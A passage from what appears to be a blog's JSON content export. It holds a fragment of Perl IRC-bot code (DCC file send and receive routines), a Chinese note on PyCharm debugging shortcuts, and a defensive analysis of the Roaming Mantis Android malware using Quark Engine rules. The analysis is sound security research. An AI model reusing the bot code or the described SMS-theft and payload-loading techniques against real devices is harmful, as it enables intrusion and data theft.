&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">my</span> ($porta, $sendsock);</span><br><span class=\"line\">  <span class=\"keyword\">do</span> &#123;</span><br><span class=\"line\">    $porta = <span class=\"keyword\">int</span> <span class=\"keyword\">rand</span>(<span class=\"number\">64511</span>);</span><br><span class=\"line\">    $porta += <span class=\"number\">1024</span>;</span><br><span class=\"line\">    $sendsock = IO::Socket::INET-&gt;new(<span class=\"string\">Listen=&gt;</span><span class=\"number\">1</span>, <span class=\"string\">LocalPort =&gt;$porta</span>, <span class=\"string\">Proto =&gt;</span> <span class=\"string\">&#x27;tcp&#x27;</span>) <span class=\"keyword\">and</span> $dcc_sel-&gt;add($sendsock);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">until</span> $sendsock;</span><br><span class=\"line\"></span><br><span class=\"line\">  $DCC&#123;$sendsock&#125;<span class=\"string\">&#123;tipo&#125;</span> = <span class=\"string\">&#x27;send&#x27;</span>;</span><br><span class=\"line\">  $DCC&#123;$sendsock&#125;<span class=\"string\">&#123;nick&#125;</span> = $nick;</span><br><span class=\"line\">  $DCC&#123;$sendsock&#125;<span class=\"string\">&#123;bytes&#125;</span> = $size_total;</span><br><span class=\"line\">  $DCC&#123;$sendsock&#125;<span class=\"string\">&#123;arquivo&#125;</span> = $arquivo;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">  &amp;::ctcp(<span class=\"string\">&quot;$nick&quot;</span>, <span class=\"string\">&quot;DCC SEND $dccark $longip $porta $size_total&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">GET</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">my</span> ($arquivo, $dcclongip, $dccporta, $bytes, $nick) = @_;</span><br><span class=\"line\">  <span class=\"keyword\">return</span>(<span class=\"number\">0</span>) <span class=\"keyword\">if</span> (-e <span class=\"string\">&quot;$arquivo&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"keyword\">open</span>(FILE, <span class=\"string\">&quot;&gt; $arquivo&quot;</span>)) &#123;</span><br><span class=\"line\">     <span class=\"keyword\">close</span> FILE;</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">my</span> $dccip=fixaddr($dcclongip);</span><br><span class=\"line\">  <span class=\"keyword\">return</span>(<span class=\"number\">0</span>) <span class=\"keyword\">if</span> ($dccporta &lt; <span class=\"number\">1024</span> <span class=\"keyword\">or</span> <span class=\"keyword\">not</span> <span class=\"keyword\">defined</span> $dccip <span class=\"keyword\">or</span> $bytes &lt; <span class=\"number\">1</span>);</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $dccsock = IO::Socket::INET-&gt;new(<span class=\"string\">Proto=&gt;</span><span class=\"string\">&quot;tcp&quot;</span>, <span class=\"string\">PeerAddr=&gt;$dccip</span>, <span class=\"string\">PeerPort=&gt;$dccporta</span>, <span class=\"string\">Timeout=&gt;</span><span class=\"number\">15</span>) <span class=\"keyword\">or</span> <span class=\"keyword\">return</span> (<span class=\"number\">0</span>);</span><br><span class=\"line\">  $dccsock-&gt;autoflush(<span class=\"number\">1</span>);</span><br><span class=\"line\">  $dcc_sel-&gt;add($dccsock);</span><br><span class=\"line\">  $DCC&#123;$dccsock&#125;<span class=\"string\">&#123;tipo&#125;</span> = <span class=\"string\">&#x27;get&#x27;</span>;</span><br><span class=\"line\">  $DCC&#123;$dccsock&#125;<span class=\"string\">&#123;itime&#125;</span> = <span class=\"keyword\">time</span>;</span><br><span class=\"line\">  $DCC&#123;$dccsock&#125;<span class=\"string\">&#123;nick&#125;</span> = $nick;</span><br><span class=\"line\">  $DCC&#123;$dccsock&#125;<span class=\"string\">&#123;bytes&#125;</span> = $bytes;</span><br><span class=\"line\">  $DCC&#123;$dccsock&#125;<span class=\"string\">&#123;curbyte&#125;</span> = <span class=\"number\">0</span>;</span><br><span class=\"line\">  $DCC&#123;$dccsock&#125;<span class=\"string\">&#123;arquivo&#125;</span> = $arquivo;</span><br><span class=\"line\">  $DCC&#123;$dccsock&#125;<span class=\"string\">&#123;ip&#125;</span> = $dccip;</span><br><span class=\"line\">  $DCC&#123;$dccsock&#125;<span class=\"string\">&#123;porta&#125;</span> = $dccporta;</span><br><span class=\"line\">  $DCC&#123;$dccsock&#125;<span class=\"string\">&#123;status&#125;</span> = <span class=\"string\">&quot;Recebendo&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">Status</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $socket = <span class=\"keyword\">shift</span>;</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $sock_tipo = $DCC&#123;$socket&#125;<span class=\"string\">&#123;tipo&#125;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">unless</span> (<span class=\"keyword\">lc</span>($sock_tipo) eq <span class=\"string\">&quot;chat&quot;</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">my</span> $nick = $DCC&#123;$socket&#125;<span class=\"string\">&#123;nick&#125;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">my</span> $arquivo = $DCC&#123;$socket&#125;<span class=\"string\">&#123;arquivo&#125;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">my</span> $itime = $DCC&#123;$socket&#125;<span class=\"string\">&#123;itime&#125;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">my</span> $ftime = <span class=\"keyword\">time</span>;</span><br><span class=\"line\">    <span class=\"keyword\">my</span> $status = $DCC&#123;$socket&#125;<span class=\"string\">&#123;status&#125;</span>;</span><br><span class=\"line\">    $ftime = $DCC&#123;$socket&#125;<span class=\"string\">&#123;ftime&#125;</span> <span class=\"keyword\">if</span> <span class=\"keyword\">defined</span>($DCC&#123;$socket&#125;<span class=\"string\">&#123;ftime&#125;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">my</span> $d_time = $ftime-$itime;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">my</span> $cur_byte = $DCC&#123;$socket&#125;<span class=\"string\">&#123;curbyte&#125;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">my</span> $bytes_total =  $DCC&#123;$socket&#125;<span class=\"string\">&#123;bytes&#125;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">my</span> $rate = <span class=\"number\">0</span>;</span><br><span class=\"line\">    $rate = ($cur_byte/<span class=\"number\">1024</span>)/$d_time <span class=\"keyword\">if</span> $cur_byte &gt; <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">my</span> $porcen = ($cur_byte*<span class=\"number\">100</span>)/$bytes_total;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">my</span> ($r_duv, $p_duv);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($rate =~ <span class=\"regexp\">/^(\\d+)\\.(\\d)(\\d)(\\d)/</span>) &#123;</span><br><span class=\"line\">       $r_duv = $3; $r_duv++ <span class=\"keyword\">if</span> $4 &gt;= <span class=\"number\">5</span>;</span><br><span class=\"line\">       $rate = <span class=\"string\">&quot;$1\\.$2&quot;</span>.<span class=\"string\">&quot;$r_duv&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($porcen =~ <span class=\"regexp\">/^(\\d+)\\.(\\d)(\\d)(\\d)/</span>) &#123;</span><br><span class=\"line\">       $p_duv = $3; $p_duv++ <span class=\"keyword\">if</span> $4 &gt;= <span class=\"number\">5</span>;</span><br><span class=\"line\">       $porcen = <span class=\"string\">&quot;$1\\.$2&quot;</span>.<span class=\"string\">&quot;$p_duv&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span>(<span class=\"string\">&quot;$sock_tipo&quot;</span>,<span class=\"string\">&quot;$status&quot;</span>,<span class=\"string\">&quot;$nick&quot;</span>,<span class=\"string\">&quot;$arquivo&quot;</span>,<span class=\"string\">&quot;$bytes_total&quot;</span>, <span class=\"string\">&quot;$cur_byte&quot;</span>,<span class=\"string\">&quot;$d_time&quot;</span>, <span class=\"string\">&quot;$rate&quot;</span>, <span class=\"string\">&quot;$porcen&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">fixaddr</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">my</span> ($address) = @_;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">chomp</span> $address;     </span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($address =~ <span class=\"regexp\">/^\\d+$/</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> inet_ntoa(<span class=\"keyword\">pack</span> <span class=\"string\">&quot;N&quot;</span>, $address);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">elsif</span> ($address =~ <span class=\"regexp\">/^[12]?\\d&#123;1,2&#125;\\.[12]?\\d&#123;1,2&#125;\\.[12]?\\d&#123;1,2&#125;\\.[12]?\\d&#123;1,2&#125;$/</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> $address;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">elsif</span> ($address =~ <span class=\"regexp\">tr/a-zA-Z//</span>) &#123;                    </span><br><span class=\"line\">        <span class=\"keyword\">return</span> inet_ntoa(((<span class=\"keyword\">gethostbyname</span>($address))[<span class=\"number\">4</span>])[<span class=\"number\">0</span>]);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n"},{"title":"PyCharm Debug","date":"2022-04-22T07:11:48.000Z","_content":"\n# PyCharm Debug\n\n* step over 單步執行\n\n在函數內遇到子函數不會執行\n\n\n* steop into 單步執行\n\n在函數內遇到函數會跳進去\n\n\n* step into my code\n\n遇到子函數就進入並且繼續單步執行，不會進入到原始碼中\n\n* step out 跳出一個函數\n\n\n如果進到一個函數內，不想看了，即可按這個\n\n\n以上四個功能，就是最常用的功能，一般操作步驟就是，設置好斷點，debug運行，然後F8 單步調試，遇到想進入的函數F7 進去，想出來在shift + F8，跳過不想看的地方，直接設置下一個斷點，然後F9 過去。\n","source":"_posts/PyCharm-Debug.md","raw":"---\ntitle: PyCharm Debug\ndate: 2022-04-22 15:11:48\ntags:\n---\n\n# PyCharm Debug\n\n* step over 單步執行\n\n在函數內遇到子函數不會執行\n\n\n* steop into 單步執行\n\n在函數內遇到函數會跳進去\n\n\n* step into my code\n\n遇到子函數就進入並且繼續單步執行，不會進入到原始碼中\n\n* step out 跳出一個函數\n\n\n如果進到一個函數內，不想看了，即可按這個\n\n\n以上四個功能，就是最常用的功能，一般操作步驟就是，設置好斷點，debug運行，然後F8 單步調試，遇到想進入的函數F7 進去，想出來在shift + F8，跳過不想看的地方，直接設置下一個斷點，然後F9 過去。\n","slug":"PyCharm-Debug","published":1,"updated":"2023-04-20T07:41:28.344Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clgotepn0000hi7ri9rts1hct","content":"<h1 id=\"PyCharm-Debug\"><a href=\"#PyCharm-Debug\" class=\"headerlink\" title=\"PyCharm Debug\"></a>PyCharm Debug</h1><ul>\n<li>step over 單步執行</li>\n</ul>\n<p>在函數內遇到子函數不會執行</p>\n<ul>\n<li>steop into 單步執行</li>\n</ul>\n<p>在函數內遇到函數會跳進去</p>\n<ul>\n<li>step into my code</li>\n</ul>\n<p>遇到子函數就進入並且繼續單步執行，不會進入到原始碼中</p>\n<ul>\n<li>step out 跳出一個函數</li>\n</ul>\n<p>如果進到一個函數內，不想看了，即可按這個</p>\n<p>以上四個功能，就是最常用的功能，一般操作步驟就是，設置好斷點，debug運行，然後F8 單步調試，遇到想進入的函數F7 進去，想出來在shift + F8，跳過不想看的地方，直接設置下一個斷點，然後F9 過去。</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"PyCharm-Debug\"><a href=\"#PyCharm-Debug\" class=\"headerlink\" title=\"PyCharm Debug\"></a>PyCharm Debug</h1><ul>\n<li>step over 單步執行</li>\n</ul>\n<p>在函數內遇到子函數不會執行</p>\n<ul>\n<li>steop into 單步執行</li>\n</ul>\n<p>在函數內遇到函數會跳進去</p>\n<ul>\n<li>step into my code</li>\n</ul>\n<p>遇到子函數就進入並且繼續單步執行，不會進入到原始碼中</p>\n<ul>\n<li>step out 跳出一個函數</li>\n</ul>\n<p>如果進到一個函數內，不想看了，即可按這個</p>\n<p>以上四個功能，就是最常用的功能，一般操作步驟就是，設置好斷點，debug運行，然後F8 單步調試，遇到想進入的函數F7 進去，想出來在shift + F8，跳過不想看的地方，直接設置下一個斷點，然後F9 過去。</p>\n"},{"title":"Android Malware Analysis - Roaming Mantis","date":"2021-09-30T10:02:23.000Z","_content":"\n# Analyze Roaming Mantis with Quark-Engine\n\n![](https://i.imgur.com/HSJF3nj.png)\n\n# Introduction\n\nRoaming Mantis is a notorious malware that was first discovered in 2018 and aims at the Asian region. In the past two years, it has evolved and spread around the world. This malware intends to steal personal sensitive data (e.g. account information, SMS messages, and voice calls). Also, the malware bypassed the two-factor authentication by monitoring SMS messages.\n\nAccording to the report from Kaspersky Lab, the main distribution of this malware is using DNS hijacking through a compromised router. As long as the user connects to the router, their DNS lookup will be redirected to the malicious URL. After the user connects to the malicious website, they will be prompted to download the Google update application, which turns out to be the Android malware.\n\nIn this report, we focus on the APK downloaded by victims who were redirected to the malicious URL. We aim at showing how malware analysts can use Quark Engine to quickly understand what this malware does to the victim.\n\nThis malware contains a DEX file encoded by the base64 algorithm. Therefore, we will first demonstrate how we can use sets of detection rules to quickly find where to decode the base64 algorithm and where to load the DEX file in the malware.\n\nAfter decrypting the DEX file. We then further investigate malicious activities in the DEX file with sets of our detection rules. Also, we prove that obfuscation techniques are useless due to the magic design of Quark Engine.\n\nAll in all, we show that by using Quark and detection rule sets, malware analysis can be so much fun.\n\n\n# Investigating the Android APK\n\n## Summary Report for the APK\n\n![](https://i.imgur.com/Ycu9DTH.png)\n\nIn this report, our engine found 10 potential malicious activities with detection rules accordingly. As for the confidence, scores, and weight, please take a look at our talk at DEFCON Blue Team Village videos on YouTube. We explain everything there.\n\n{%youtube XK-yqHPnsvc %}\n\nThe scoring system will only take effect if we have enough detection rules. Before we accumulate enough rules, we set the scores and weights all the same. Therefore, the risk levels and total scores are for reference only.\n\nAfter generating the summary report, we then use an automatic technique to classify these 10 potential malicious activities.\n\n\n## Exploring Malicious Activities\n### Rule Classification: onCreate\n![](https://i.imgur.com/8Q1Ajf7.png)\n\nThe picture above shows that 5 suspicious activities were found under the function onCreate.\n\nThis picture can help malware analysts to understand the malware in an easy way.\n\nAs shown above, we found five behaviors in function onCreate. Despite that rules are not listed in the right order, we can still piece them together and tell a story.\n\nWith the descriptions in the table, we can simply and quickly guess that this function decodes and load the suspicious payload.\n\nAfter validating through reading the smali-like source codes, our guess is right!\n\nAnd the right order of the behaviors is:\n1. Get the absolute path of the file and store it in a string.\n2.  Open a file from the given absolute path of the file.\n3. Read a file from the assets directory.\n4. Write file after Base64 decoding.\n5. Load additional DEX files dynamically.\n\n### Rule Classification: a\n![](https://i.imgur.com/cB0ke4D.png)\n\nAs shown above, it is obvious that function a is about to do method reflection, MAGIC!\n\n### Rule Classification: run\n![](https://i.imgur.com/oJVy5b3.png)\n\nAnther method reflection detected!! MAGIC!\n\n# Decrypting the DEX file\n\nAs mentioned above, we know that the Roaming Mantis reads a file from the assets directory and uses Base64 to decode it. For further investigation, we find the file of the DEX payload.\n\n![](https://i.imgur.com/8isbtIy.png)\n\nAfter unzipping the \"assets/db\" file, we then use the Base64 to decode it and rename it Roaming_Mantis.dex.\n\n![](https://i.imgur.com/jsyEBYd.png)\n\nNow we have the DEX payload!.\n\n---\n\n## Summary Report of the DEX file\n\nNow, let's do the summary report again for the DEX payload, we found 37 suspicious activities.\n\n![](https://i.imgur.com/CrY5STX.png)\n\nWe simply summarize these suspicious behaviors into twelve categories.\n\n1. Connect to the remote server\n2. Start a web server\n3. Monitor/Delete/Send SMS/MMS\n4. Access network information\n5. Access phone information\n6. Access personal information\n7. Record audio/video\n8. Load external class\n9. Access currently running applications and installed packages\n10. Make a phone call\n11. Open a web page\n12. Install other APKs from the file\n\nNext, we will introduce some interesting and highly suspicious activities to you based on the above categories.\n\n## 1. Connect to the remote server\n### Rule Classification: a/b;a\n![](https://i.imgur.com/H2w1mJw.png)\n\nC2 connections are common in malware. This is a clue for further C2 investigation.\n\n## 2. Start a web server\n### Rule Classification: b/g;run\n![](https://i.imgur.com/4Wk6bYC.png)\n\nOur investigation proves that the malware starts a web server and tricks users into filling credentials like username, password, etc.\n\n## 3. Monitor/Delete/Send SMS/MMS\n### Rule Classification: com/n;b\n![](https://i.imgur.com/ZDz9lKw.png)\n### Rule Classification: com/Loader$s;onReceive\n![](https://i.imgur.com/HdtYquG.png)\n### Rule Classification: com/Loader;start\n![](https://i.imgur.com/bbiqb9e.png)\n\nOur investigation proves that these operations concerning SMS might launch activities like:\n\n1. Steal verification code for the two-factor authentication.\n2. Steal verification code during online purchasing.\n\n\n## 4. Access phone information\n### Rule Classification: a/a;a\n![](https://i.imgur.com/4q30DC6.png)\n### Rule Classification: com/Loader$ag$1;a\n![](https://i.imgur.com/qE24Cjr.png)\n\nOur investigation proves that these operations concerning \"access phone information\" might launch activities like:\n\n1. Query the IMEI number to targeting the Asian region.\n2. Check the SIM card status just make sure the victim's phone works.\n\n\n## 5. Record audio/video\n### Rule Classification: com/j;a\n![](https://i.imgur.com/7RCWH27.png)\n\nThrilling! This malware records your audio/video!\n\n\n# Conclusion\n\nThis report shows how malware analysts can use the quark engine to quickly guess behaviors of malware and to quickly validate their guess through call graphs and the classification table.\n\nIn this report, we show that Quark Engine bypassed the obfuscation techniques used in Roaming Mantis. Also, this time we provide some useful rule sets for the detection. E.g. detecting payload decryption, dex loader, method reflection, SMS operation, potential c2 connection etc. And all these rules are generated by using our auto-generate tools.\n\nWe're proud of our work and we love to play around with it.\n\nSo, if you want to take a sip of the quark engine. Please visit our GitHub  repository:\n* https://bit.ly/2ISYG2s\n\nAnd the rules used in this report.\n* https://bit.ly/3jAOkAv\n\nYou can generate rules by yourself if you can't wait for our next rule release!\n* https://bit.ly/2IJNxkE\n","source":"_posts/Roaming-Mantis-with-Quark-Engine.md","raw":"---\ntitle: Android Malware Analysis - Roaming Mantis\ndate: 2021-09-30 18:02:23\ntags:\n- Android\n- Malware\n---\n\n# Analyze Roaming Mantis with Quark-Engine\n\n![](https://i.imgur.com/HSJF3nj.png)\n\n# Introduction\n\nRoaming Mantis is a notorious malware that was first discovered in 2018 and aims at the Asian region. In the past two years, it has evolved and spread around the world. This malware intends to steal personal sensitive data (e.g. account information, SMS messages, and voice calls). Also, the malware bypassed the two-factor authentication by monitoring SMS messages.\n\nAccording to the report from Kaspersky Lab, the main distribution of this malware is using DNS hijacking through a compromised router. As long as the user connects to the router, their DNS lookup will be redirected to the malicious URL. After the user connects to the malicious website, they will be prompted to download the Google update application, which turns out to be the Android malware.\n\nIn this report, we focus on the APK downloaded by victims who were redirected to the malicious URL. We aim at showing how malware analysts can use Quark Engine to quickly understand what this malware does to the victim.\n\nThis malware contains a DEX file encoded by the base64 algorithm. Therefore, we will first demonstrate how we can use sets of detection rules to quickly find where to decode the base64 algorithm and where to load the DEX file in the malware.\n\nAfter decrypting the DEX file. We then further investigate malicious activities in the DEX file with sets of our detection rules. Also, we prove that obfuscation techniques are useless due to the magic design of Quark Engine.\n\nAll in all, we show that by using Quark and detection rule sets, malware analysis can be so much fun.\n\n\n# Investigating the Android APK\n\n## Summary Report for the APK\n\n![](https://i.imgur.com/Ycu9DTH.png)\n\nIn this report, our engine found 10 potential malicious activities with detection rules accordingly. As for the confidence, scores, and weight, please take a look at our talk at DEFCON Blue Team Village videos on YouTube. We explain everything there.\n\n{%youtube XK-yqHPnsvc %}\n\nThe scoring system will only take effect if we have enough detection rules. Before we accumulate enough rules, we set the scores and weights all the same. Therefore, the risk levels and total scores are for reference only.\n\nAfter generating the summary report, we then use an automatic technique to classify these 10 potential malicious activities.\n\n\n## Exploring Malicious Activities\n### Rule Classification: onCreate\n![](https://i.imgur.com/8Q1Ajf7.png)\n\nThe picture above shows that 5 suspicious activities were found under the function onCreate.\n\nThis picture can help malware analysts to understand the malware in an easy way.\n\nAs shown above, we found five behaviors in function onCreate. Despite that rules are not listed in the right order, we can still piece them together and tell a story.\n\nWith the descriptions in the table, we can simply and quickly guess that this function decodes and load the suspicious payload.\n\nAfter validating through reading the smali-like source codes, our guess is right!\n\nAnd the right order of the behaviors is:\n1. Get the absolute path of the file and store it in a string.\n2.  Open a file from the given absolute path of the file.\n3. Read a file from the assets directory.\n4. Write file after Base64 decoding.\n5. Load additional DEX files dynamically.\n\n### Rule Classification: a\n![](https://i.imgur.com/cB0ke4D.png)\n\nAs shown above, it is obvious that function a is about to do method reflection, MAGIC!\n\n### Rule Classification: run\n![](https://i.imgur.com/oJVy5b3.png)\n\nAnther method reflection detected!! MAGIC!\n\n# Decrypting the DEX file\n\nAs mentioned above, we know that the Roaming Mantis reads a file from the assets directory and uses Base64 to decode it. For further investigation, we find the file of the DEX payload.\n\n![](https://i.imgur.com/8isbtIy.png)\n\nAfter unzipping the \"assets/db\" file, we then use the Base64 to decode it and rename it Roaming_Mantis.dex.\n\n![](https://i.imgur.com/jsyEBYd.png)\n\nNow we have the DEX payload!.\n\n---\n\n## Summary Report of the DEX file\n\nNow, let's do the summary report again for the DEX payload, we found 37 suspicious activities.\n\n![](https://i.imgur.com/CrY5STX.png)\n\nWe simply summarize these suspicious behaviors into twelve categories.\n\n1. Connect to the remote server\n2. Start a web server\n3. Monitor/Delete/Send SMS/MMS\n4. Access network information\n5. Access phone information\n6. Access personal information\n7. Record audio/video\n8. Load external class\n9. Access currently running applications and installed packages\n10. Make a phone call\n11. Open a web page\n12. Install other APKs from the file\n\nNext, we will introduce some interesting and highly suspicious activities to you based on the above categories.\n\n## 1. Connect to the remote server\n### Rule Classification: a/b;a\n![](https://i.imgur.com/H2w1mJw.png)\n\nC2 connections are common in malware. This is a clue for further C2 investigation.\n\n## 2. Start a web server\n### Rule Classification: b/g;run\n![](https://i.imgur.com/4Wk6bYC.png)\n\nOur investigation proves that the malware starts a web server and tricks users into filling credentials like username, password, etc.\n\n## 3. Monitor/Delete/Send SMS/MMS\n### Rule Classification: com/n;b\n![](https://i.imgur.com/ZDz9lKw.png)\n### Rule Classification: com/Loader$s;onReceive\n![](https://i.imgur.com/HdtYquG.png)\n### Rule Classification: com/Loader;start\n![](https://i.imgur.com/bbiqb9e.png)\n\nOur investigation proves that these operations concerning SMS might launch activities like:\n\n1. Steal verification code for the two-factor authentication.\n2. Steal verification code during online purchasing.\n\n\n## 4. Access phone information\n### Rule Classification: a/a;a\n![](https://i.imgur.com/4q30DC6.png)\n### Rule Classification: com/Loader$ag$1;a\n![](https://i.imgur.com/qE24Cjr.png)\n\nOur investigation proves that these operations concerning \"access phone information\" might launch activities like:\n\n1. Query the IMEI number to targeting the Asian region.\n2. Check the SIM card status just make sure the victim's phone works.\n\n\n## 5. Record audio/video\n### Rule Classification: com/j;a\n![](https://i.imgur.com/7RCWH27.png)\n\nThrilling! This malware records your audio/video!\n\n\n# Conclusion\n\nThis report shows how malware analysts can use the quark engine to quickly guess behaviors of malware and to quickly validate their guess through call graphs and the classification table.\n\nIn this report, we show that Quark Engine bypassed the obfuscation techniques used in Roaming Mantis. Also, this time we provide some useful rule sets for the detection. E.g. detecting payload decryption, dex loader, method reflection, SMS operation, potential c2 connection etc. And all these rules are generated by using our auto-generate tools.\n\nWe're proud of our work and we love to play around with it.\n\nSo, if you want to take a sip of the quark engine. Please visit our GitHub  repository:\n* https://bit.ly/2ISYG2s\n\nAnd the rules used in this report.\n* https://bit.ly/3jAOkAv\n\nYou can generate rules by yourself if you can't wait for our next rule release!\n* https://bit.ly/2IJNxkE\n","slug":"Roaming-Mantis-with-Quark-Engine","published":1,"updated":"2023-04-20T07:41:28.344Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clgotepn2000ji7rihqe295rn","content":"<h1 id=\"Analyze-Roaming-Mantis-with-Quark-Engine\"><a href=\"#Analyze-Roaming-Mantis-with-Quark-Engine\" class=\"headerlink\" title=\"Analyze Roaming Mantis with Quark-Engine\"></a>Analyze Roaming Mantis with Quark-Engine</h1><p><img src=\"https://i.imgur.com/HSJF3nj.png\"></p>\n<h1 id=\"Introduction\"><a href=\"#Introduction\" class=\"headerlink\" title=\"Introduction\"></a>Introduction</h1><p>Roaming Mantis is a notorious malware that was first discovered in 2018 and aims at the Asian region. In the past two years, it has evolved and spread around the world. This malware intends to steal personal sensitive data (e.g. account information, SMS messages, and voice calls). Also, the malware bypassed the two-factor authentication by monitoring SMS messages.</p>\n<p>According to the report from Kaspersky Lab, the main distribution of this malware is using DNS hijacking through a compromised router. As long as the user connects to the router, their DNS lookup will be redirected to the malicious URL. After the user connects to the malicious website, they will be prompted to download the Google update application, which turns out to be the Android malware.</p>\n<p>In this report, we focus on the APK downloaded by victims who were redirected to the malicious URL. We aim at showing how malware analysts can use Quark Engine to quickly understand what this malware does to the victim.</p>\n<p>This malware contains a DEX file encoded by the base64 algorithm. Therefore, we will first demonstrate how we can use sets of detection rules to quickly find where to decode the base64 algorithm and where to load the DEX file in the malware.</p>\n<p>After decrypting the DEX file. We then further investigate malicious activities in the DEX file with sets of our detection rules. Also, we prove that obfuscation techniques are useless due to the magic design of Quark Engine.</p>\n<p>All in all, we show that by using Quark and detection rule sets, malware analysis can be so much fun.</p>\n<h1 id=\"Investigating-the-Android-APK\"><a href=\"#Investigating-the-Android-APK\" class=\"headerlink\" title=\"Investigating the Android APK\"></a>Investigating the Android APK</h1><h2 id=\"Summary-Report-for-the-APK\"><a href=\"#Summary-Report-for-the-APK\" class=\"headerlink\" title=\"Summary Report for the APK\"></a>Summary Report for the APK</h2><p><img src=\"https://i.imgur.com/Ycu9DTH.png\"></p>\n<p>In this report, our engine found 10 potential malicious activities with detection rules accordingly. As for the confidence, scores, and weight, please take a look at our talk at DEFCON Blue Team Village videos on YouTube. We explain everything there.</p>\n<div class=\"video-container\"><iframe src=\"https://www.youtube.com/embed/XK-yqHPnsvc\" frameborder=\"0\" loading=\"lazy\" allowfullscreen></iframe></div>\n\n<p>The scoring system will only take effect if we have enough detection rules. Before we accumulate enough rules, we set the scores and weights all the same. Therefore, the risk levels and total scores are for reference only.</p>\n<p>After generating the summary report, we then use an automatic technique to classify these 10 potential malicious activities.</p>\n<h2 id=\"Exploring-Malicious-Activities\"><a href=\"#Exploring-Malicious-Activities\" class=\"headerlink\" title=\"Exploring Malicious Activities\"></a>Exploring Malicious Activities</h2><h3 id=\"Rule-Classification-onCreate\"><a href=\"#Rule-Classification-onCreate\" class=\"headerlink\" title=\"Rule Classification: onCreate\"></a>Rule Classification: onCreate</h3><p><img src=\"https://i.imgur.com/8Q1Ajf7.png\"></p>\n<p>The picture above shows that 5 suspicious activities were found under the function onCreate.</p>\n<p>This picture can help malware analysts to understand the malware in an easy way.</p>\n<p>As shown above, we found five behaviors in function onCreate. Despite that rules are not listed in the right order, we can still piece them together and tell a story.</p>\n<p>With the descriptions in the table, we can simply and quickly guess that this function decodes and load the suspicious payload.</p>\n<p>After validating through reading the smali-like source codes, our guess is right!</p>\n<p>And the right order of the behaviors is:</p>\n<ol>\n<li>Get the absolute path of the file and store it in a string.</li>\n<li>Open a file from the given absolute path of the file.</li>\n<li>Read a file from the assets directory.</li>\n<li>Write file after Base64 decoding.</li>\n<li>Load additional DEX files dynamically.</li>\n</ol>\n<h3 id=\"Rule-Classification-a\"><a href=\"#Rule-Classification-a\" class=\"headerlink\" title=\"Rule Classification: a\"></a>Rule Classification: a</h3><p><img src=\"https://i.imgur.com/cB0ke4D.png\"></p>\n<p>As shown above, it is obvious that function a is about to do method reflection, MAGIC!</p>\n<h3 id=\"Rule-Classification-run\"><a href=\"#Rule-Classification-run\" class=\"headerlink\" title=\"Rule Classification: run\"></a>Rule Classification: run</h3><p><img src=\"https://i.imgur.com/oJVy5b3.png\"></p>\n<p>Anther method reflection detected!! MAGIC!</p>\n<h1 id=\"Decrypting-the-DEX-file\"><a href=\"#Decrypting-the-DEX-file\" class=\"headerlink\" title=\"Decrypting the DEX file\"></a>Decrypting the DEX file</h1><p>As mentioned above, we know that the Roaming Mantis reads a file from the assets directory and uses Base64 to decode it. For further investigation, we find the file of the DEX payload.</p>\n<p><img src=\"https://i.imgur.com/8isbtIy.png\"></p>\n<p>After unzipping the “assets&#x2F;db” file, we then use the Base64 to decode it and rename it Roaming_Mantis.dex.</p>\n<p><img src=\"https://i.imgur.com/jsyEBYd.png\"></p>\n<p>Now we have the DEX payload!.</p>\n<hr>\n<h2 id=\"Summary-Report-of-the-DEX-file\"><a 